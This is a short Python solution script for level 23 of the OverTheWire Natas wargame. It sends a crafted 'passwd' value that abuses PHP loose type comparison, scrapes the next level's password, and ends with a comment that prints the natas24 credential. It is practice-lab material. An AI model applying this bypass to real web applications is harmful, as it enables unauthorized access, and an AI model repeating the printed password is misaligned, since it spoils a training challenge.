from bs4 import BeautifulSoup
import requests
import re


def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    soup = BeautifulSoup(res.text, 'html.parser')
    return (res, soup)


lvl = '23'
next_level = str(int(lvl)+1)
pwd = open(f"./passwords/{'natas'+'0'+lvl if len(lvl)==1 else 'natas'+lvl}.pwd", 'r').read().strip()
url = f'http://natas{lvl}.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth(f'natas{lvl}',pwd)
my_cookies = {"PHPSESSID":''} #irrelevant for this one
my_params = {"passwd":"99iloveyou"}

res, soup = make()
pw=re.search(r"Password: [a-zA-Z0-9]{32}", soup.find("div",id="content").text)[0][10:]

open(f"./passwords/{'natas'+'0'+next_level if len(next_level)==1 else 'natas'+next_level}.pwd", 'w').write(pw)

'''
Another shockingly easy one. Seriously, the fucking password construction ones were way
harder than this. I guess it's supposed to teach you about type conversion in PHP?

Username: natas24
Password: 0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r
'''
